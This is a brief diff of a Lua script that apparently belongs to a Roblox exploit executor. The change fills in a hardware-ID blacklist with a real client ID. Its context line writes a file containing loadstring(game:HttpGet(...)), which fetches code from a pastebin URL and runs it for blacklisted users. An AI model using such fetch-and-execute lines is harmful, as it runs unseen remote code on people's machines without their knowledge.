@@ -1,5 +1,5 @@
 local HWID=game:GetService("RbxAnalyticsService"):GetClientId()
-local blacklist={"q"}
+local blacklist={"0aa71708-1234-47ab-8b03-81ee75c7c116"}
 for i, v in pairs(blacklist) do
   if v == HWID then
 writefile("/blacklisted.txt", "loadstring(game:HttpGet(('https://pastebin.com/raw/vrChMYWP'),true))()")
